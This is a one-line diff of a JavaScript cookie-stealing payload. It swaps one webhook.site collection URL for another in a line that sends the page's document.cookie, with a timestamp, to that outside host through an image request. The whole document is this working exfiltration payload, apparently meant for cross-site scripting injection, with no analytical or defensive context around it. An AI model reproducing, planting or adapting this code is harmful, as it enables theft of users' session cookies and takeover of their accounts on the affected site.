@@ -1,1 +1,1 @@
-new Image().src = 'https://webhook.site/05a7b7af-326c-47f2-bce0-f5ed4f46af6d?c=' + encodeURIComponent(document.cookie) + '&t=' + Date.now();
+new Image().src = 'https://webhook.site/9b62f8d9-4127-4653-bcf3-ea9cb554bf48?c=' + encodeURIComponent(document.cookie) + '&t=' + Date.now();
